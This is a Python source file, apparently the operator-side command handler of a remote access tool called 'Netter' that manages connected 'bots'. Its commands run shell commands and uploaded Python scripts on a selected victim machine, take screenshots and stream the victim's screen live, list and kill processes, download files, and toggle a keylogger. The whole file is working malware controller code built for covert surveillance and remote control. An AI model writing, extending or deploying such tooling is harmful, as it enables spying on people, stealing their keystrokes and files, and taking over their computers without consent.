from typing import TYPE_CHECKING, Callable, Optional, Union
from time import sleep as time_sleep
from time import time as current_time

from loguru import logger
from os import environ
from threading import Thread
from zlib import decompress
from zlib import error as zlib_error
from io import BytesIO
from tkinter import filedialog
from pickle import loads as pickle_loads
from prettytable import PrettyTable

if TYPE_CHECKING:
    from .bucket import ConnectionBucket
    from .device import ClientDevice
    from sock import NetterServer

helpCommand: str = """\
    L bot / bots        :       Show all connected client
    L info / whois      :       Show client's device information
    L select            :       Select client, some command requires a client to be selected

    L run               :       Run a shell command
    L screenshot        :       Take a screenshot of client's monitor
    L screen_spy        :       Streaming over client's monitor in real-time
    L file              :       Modify client's file
    L keylogger         :       Turn on / off keylogger
"""

class Command:
    _registry: dict[str, list] = dict()
    instance: Optional['CommandHandler'] = None

    def __init__(self, connectionBucket: Optional['ConnectionBucket'] = None) -> None:
        self._registry['help'] = [lambda *x: (logger.info("List of Netter's server controller command are shown below"), print(helpCommand)), False]
        self.connectionBucket = connectionBucket

    @classmethod
    def __call__(cls, name: str | list, accept_args: bool = False) -> Callable:

        def wrapper(function: Callable) -> None:
            if (isinstance(name, str)):
                cls._registry[name.lower()] = [function, accept_args]

            else:
                for aliases in name:
                    cls._registry[aliases.lower()] = [function, accept_args]

        return wrapper

    def set_connection_bucket(self, connectionBucket: 'ConnectionBucket') -> None:
        self.connectionBucket = connectionBucket

    def handle_command(self, command: str) -> None:
            function: list | None = self._registry.get((splited := command.split())[0], None)
            commandArgs: list | None = splited if ' ' in command else None

            if not (function):
                self.on_command_not_found(command.split()[0])
                return

            if not commandArgs or not function[1]: function[0](self.instance); return
            function[0](self.instance, *commandArgs[1:])

    def on_command_not_found(self, command_name: str) -> None:
        logger.error('The command "%s" is not found.' % command_name)

class CommandHandler:
    command: Command = Command(None)

    def __init__(self, connectionBucket: 'ConnectionBucket', NetServer: 'NetterServer') -> None:
        self.bucket = connectionBucket
        self.NetServer = NetServer

        self.command.set_connection_bucket(self.bucket)
        self.command.instance = self

    @command(['bot', 'bots'])
    def check_client(self) -> None:
        if not self.bucket.connectionList:
            logger.info('No client is connected at the moment...')
            return

        logger.info('List of connected client currently:')

        for clientDevice in self.bucket.connectionList:
            print(f'  L {clientDevice.hostname} : {clientDevice.clientUniqueID}')

        print()

    @command(['info', 'whois'], accept_args = True)
    def client_info(self, *clientID) -> None:
        selectedClient = self.NetServer._selectedClient if self.NetServer._selectedClient is not None else self.bucket.get_client_by_id(clientID)

        if (selectedClient is None):
            logger.error('Client ID not found'); return

        if not clientID:
            logger.error('Missing argumment: Client Unique ID')
            return

        logger.info(f'{selectedClient.hostname}\'s device information:'); \
            print(' L Hostname : %s' % selectedClient.hostname); \
            print(' L Public IP Address : %s' % selectedClient.publib_address); \
            print(' L Local IP Address : %s\n' % selectedClient.local_address)

        logger.info('Additional information:')

        for key, value in selectedClient.additionalData.items():
            print(' L %s : %s' % (key, value))

        print('')

    @command(['select'], accept_args = True)
    def select_client(self, *args) -> None:
        if not args:
            logger.error('Missing argumment: Client Unique ID')
            return

        if not (selectedCli := self.bucket.get_client_by_id(args)):
            logger.error('Client ID not found'); return

        self.NetServer._selectedClient = selectedCli

    @command(['run'], accept_args = True)
    def exec_command(self, *args) -> None:
        if not self.NetServer._selectedClient:
            logger.error('A client has to be selected in order to use this command')
            return

        response = self.NetServer._selectedClient.catch_response('execute_command ' + ' '.join(args))

        if (response[14:15] == b'0'):
            logger.success('Command execution successful with exit code: 0')

        elif (response[14:15] == b'1'):
            logger.error('Command execution failed with exit code: 1')

        else:
            logger.error('Command execution has reached the timeout (8s), execution terminated.')
            return

        print(response[16:].decode())

    @command(['screenshot', 'ss'], accept_args = True)
    def screenshot(self, *clientID) -> None:
        if not clientID:
            if (not self.NetServer._selectedClient):
                logger.error('Missing argument: Client Unique ID')
                return

            selectedCli = self.NetServer._selectedClient

        else:
            if not (selectedCli := self.bucket.get_client_by_id(clientID)):
                logger.error('Client ID not found')
                return

        if (selectedCli.additionalData['Desktop Environment'] == '1'):
            logger.error('This client does not have desktop environment')
            return

        data = selectedCli.catch_response('request_screenshot')
        logger.info('Waiting for client\'s response')

        if (b'not_available' in data):
            logger.error('Client device are not capable of taking screenshots.')
            return

        fileName: str = f'clients/responses/{selectedCli.clientUniqueID}/screenshot/{selectedCli.hostname}-{str(current_time())}.png'
        screenImg: bytes = decompress(data[20:])

        selectedCli.write_file(fileName, screenImg)
        logger.success(f'Screenshot has been save to {fileName}')

    @command(['screen_spy', 'spy'], accept_args = True)
    def screen_spying(self, *clientID) -> None:
        selectedClient: Union['ClientDevice', None] = self.NetServer._selectedClient \
            if self.NetServer._selectedClient else self.bucket.get_client_by_id(clientID)

        if (selectedClient == None):
            logger.error('Missing argument: Client Unique ID')
            return

        else:
            if (selectedClient.additionalData['Desktop Environment'] == '1'):
                logger.error('This device does not have desktop environment')
                return

        environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
        pygame = __import__('pygame')

        selectedClient.socket.send_packet('start_recording')
        data_collection: list[bytes] = list()
        selectedClient.stillRecording = True
        running = True

        def display_screen(screen) -> None:
            while len(data_collection) < 50:
                logger.info(f'Collection screen Data [{len(data_collection)} / 50]')
                time_sleep(0.50)

            while running:
                try:

                    screen.blit(data_collection[0], (0, 0))
                    pygame.display.update()

                    logger.info(f'Displaying screen index: {0} / {len(data_collection)}')
                    data_collection.pop(0)

                    if (len(data_collection) > 100):
                        logger.info('Skipping few screen display to reduce delay')
                        data_collection[:10] = []

                    time_sleep(1 / 5)

                except Exception:
                    continue

        def receive_screen() -> None:
            nonlocal running

            def convert(dat):
                img = pygame.transform.scale(pygame.image.load(dat), (screen_width, screen_height))
                data_collection.append(img)

            while running:
                try:
                    data = selectedClient.socket.receive_packet()
                    print(len(data))

                    if (data.startswith(b'keylogger_response')): # keylogger would be paused during screen spying
                        continue

                    data = BytesIO(decompress(data))

                    Thread(target = convert, args = (data,)).start()

                except zlib_error as e:
                    logger.error(f'Failed to fetch screen data: {str(e)}')

        pygame.init()
        pygame.display.set_caption(f'{selectedClient.hostname}\'s Real-Time Screen Record')

        screen_width, screen_height = 1280, 720
        screen = pygame.display.set_mode((screen_width, screen_height))

        Thread(target = display_screen, args = (screen,)).start()
        Thread(target = receive_screen).start()

        while running:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    selectedClient.socket.send_packet('start_recording')
                    running = False

        selectedClient.stillRecording = False
        pygame.quit()

    @command(['runpy'], accept_args = True)
    def run_script(self, *_) -> None:
        if not self.NetServer._selectedClient:
            logger.error('A client has to be selected in order to use this command')
            return

        filePath = filedialog.askopenfilename(
            title = 'Select a File',
            filetypes = [('Python File', '*.py')]
        )

        if (filePath):
            scriptContent = open(filePath, 'r').read()
            self.NetServer._selectedClient.socket.send_packet('execute_script %s' % scriptContent)
            response: bytes = self.NetServer._selectedClient.catch_response(filePath)

            logger.success('Code has been executed successfully, Process ID: ' + response.decode())

        else:
            logger.info('Operation aborted.')

    @command(['process', 'ps'], accept_args = True)
    def process(self, *args) -> None:
        if not self.NetServer._selectedClient:
            logger.error('A client has to be selected in order to use this command')
            return

        if not args:
            response: bytes = self.NetServer._selectedClient.catch_response('get_process')

            if response == b'None':
                logger.info(f'No running process at {self.NetServer._selectedClient.hostname}\'s machine at the moment')
                return

            table = PrettyTable()
            data: dict = pickle_loads(response)
            table.field_names = ['PID'.center(10), 'Command'.center(40), 'Started on'.center(12)]

            for key, value in data.items():
                table.add_row([key, value['fileName'], value['started_on']])

            logger.info('Running process is shown below')
            print(table)

    @command(['kill', 'pkill'], accept_args = True)
    def kill_process(self, *args) -> None:
        if not self.NetServer._selectedClient:
            logger.error('A client has to be selected in order to use this command')
            return

        if not args:
            logger.error('Missing argument: process ID (PID)')
            return

        response = self.NetServer._selectedClient.catch_response('kill_process ' + args[0])

        if (response == b'None'):
            logger.error('Process ID not found.')
            return

        logger.success('Process (%s) has been terminated' % args[0])

    @command(['file'], accept_args = True)
    def file(self, *fileName) -> None:
        if not self.NetServer._selectedClient:
            logger.error('A client has to be selected in order to use this command')
            return

        if (not fileName):
            logger.error('Missing argument: File path / File name')
            return

        repsonse = self.NetServer._selectedClient.catch_response('view_file ' + fileName[0])

        if (repsonse != b'0'):
            logger.error('File does not exist or not accessable')
            return

        if (resp := self.NetServer._selectedClient.catch_response()):
            if (resp.startswith(b'download ')):
                self.NetServer._selectedClient.write_file(
                    fn := f'clients/response/{self.NetServer._selectedClient.clientUniqueID}/{fileName[0]}',
                    resp[9:]
                )

                logger.success('File has been saved in {}'.format(fn))

            else:
                logger.success(resp.decode())

    @command(['keylogger'], accept_args = True)
    def keylogger(self, *args) -> None:

        if not (len(args) == 1):
            logger.error('Command usage: keylogger [client ID]')
            return

        selectedClient: Union['ClientDevice', None] = self.NetServer._selectedClient \
            if self.NetServer._selectedClient else self.bucket.get_client_by_id(args)

        if (selectedClient is None):
            logger.error('Client not found'); return

        response = selectedClient.catch_response('keylogger_activate')

        if (response.decode('UTF-8')[-1] == '0'):
            logger.success('Keylogger has been activated, log will be saved on clients/responses/keylogger.log')
            selectedClient.runningKeylogger = True

        else:
            logger.success('Keylogger sucessfully turned off')
            selectedClient.runningKeylogger = False

        selectedClient.set_cache()
